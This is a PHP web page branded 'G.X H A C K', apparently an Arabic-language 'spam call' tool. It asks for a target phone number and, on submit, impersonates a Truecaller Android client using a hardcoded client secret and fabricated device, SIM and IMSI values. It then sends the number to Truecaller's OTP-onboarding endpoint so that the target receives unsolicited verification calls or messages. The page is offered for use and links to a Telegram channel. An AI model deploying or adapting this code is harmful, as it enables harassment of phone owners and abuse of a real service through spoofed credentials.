<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css?family=Orbitron:700&display=swap" rel="stylesheet">
    <title>G.X H A C K</title>
    <style type="text/css">
        body {
            background-color: #000000;
            color: #FFFFFF;
            text-align: center;
            font-family: Arial, sans-serif;
            direction: rtl;
        }
        h1 {
            color: #333;
            font-size: 40px;
            margin: 1px auto;
            text-align: center;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
        }
        .neon {
            color: #FFFFFF;
            text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;
        }
        .matrix {
            color: #FFFFFF;
            font-family: Arial, Courier, Monotype;
            font-size: 5pt;
            text-align: center;
            width: 10px;
            padding: 0;
            margin: 0;
        }
        .container {
            max-width: 300px;
            margin: 0 auto;
            background-color: #ff9900;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0 0 8px rgba(0,0,0,0.1);
        }
        h2 {
            color: #333333;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #000;
            border-radius: 6px;
            font-size: 16px;
        }
        input[type="submit"] {
            background-color: #000;
            color: #ffffffff;
            border: none;
            padding: 12px 20px;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
            border-radius: 6px;
        }
        input[type="submit"]:hover {
            background-color: #cc0000;
        }
        marquee {
            margin: 20px 0;
        }
        hr {
            border: 0;
            border-top: 1px solid #333;
            margin: 20px 0;
        }

        /* Animation for the text */
        @keyframes textGlow {
            0% {
                text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;
                color: #ffffff;
            }
            50% {
                text-shadow: 0 0 15px #ff9900, 0 0 25px #ff9900, 0 0 35px #ff9900, 0 0 50px #ff9900, 0 0 70px #ff9900;
                color: #ff9900;
            }
            100% {
                text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;
                color: #ffffff;
            }
        }

        #animated-text {
            font-size: 50px;
            animation: textGlow 2s infinite alternate;
        }
    </style>
</head>
<body>
    <br>
<div id="animated-text">G.X H A C K</div>
    <br><br>
    <div id="animated-text">A Y M A N</div>
    <br><br>

    <div class="container">
        <h2>SPAM CALL {BY:G.XHACK}</h2>
        <form action="" method="POST">
            <label for="number">أدخل الرقم المستهدف:</label><br>
            <input type="text" id="number" name="number" required><br><br>
            <input type="submit" value="إرسال">
        </form>
        <strong>
            <marquee behavior="alternate" scrollamount="10">
                <h1 style="color: #ff9900; text-shadow: 0 0 10px #ff9900;">AYMAN</h1>
            </marquee>
        </strong>
        <hr>
        <h1>
            <h7 style="text-align:center;"><font color="#ff9900"><a href="https://t.me/gxhack200_ok">قناة تيليجرام</a></font></h7>
        </h1>
    </div>

    <?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $number = $_POST['number'];

    // Generate MD5 hash
    $asa = '123456789';
    $gigk = '';
    for ($i = 0; $i < 10; $i++) {
        $gigk .= $asa[random_int(0, strlen($asa) - 1)];
    }
    $md5 = substr(md5($gigk), 0, 16);

    // Set headers
    $headers = [
        "Host: account-asia-south1.truecaller.com",
        "Content-Type: application/json; charset=UTF-8",
        "Accept-Encoding: gzip",
        "User-Agent: Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret: lvc22mp3l1sfv6ujg83rd17btt"
    ];

    // Set POST data
    $data = json_encode([
        "countryCode" => "eg",
        "dialingCode" => 20,
        "installationDetails" => [
            "app" => [
                "buildVersion" => 8,
                "majorVersion" => 12,
                "minorVersion" => 34,
                "store" => "GOOGLE_PLAY"
            ],
            "device" => [
                "deviceId" => $md5,
                "language" => "ar",
                "manufacturer" => "Xiaomi",
                "mobileServices" => ["GMS"],
                "model" => "Redmi Note 8A Prime",
                "osName" => "Android",
                "osVersion" => "7.1.2",
                "simSerials" => ["8920022021714943876f", "8920022022805258505f"]
            ],
            "language" => "ar",
            "sims" => [
                ["imsi" => "602022207634386", "mcc" => "602", "mnc" => "2", "operator" => "vodafone"],
                ["imsi" => "602023133590849", "mcc" => "602", "mnc" => "2", "operator" => "vodafone"]
            ],
            "storeVersion" => [
                "buildVersion" => 8,
                "majorVersion" => 12,
                "minorVersion" => 34
            ]
        ],
        "phoneNumber" => $number,
        "region" => "region-2",
        "sequenceNo" => 1
    ]);

    // Initialize cURL
    $ch = curl_init('https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    // Execute request
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo '<p style="color: red;">حاول مرة أخرى</p>';
    } else {
        echo '<p style="color: green;">تم الإرسال بنجاح</p>';
    }
    curl_close($ch);

    // Display response
    echo '<pre>' . htmlspecialchars($response, ENT_QUOTES, 'UTF-8') . '</pre>';
}
?>
</body>
</html>
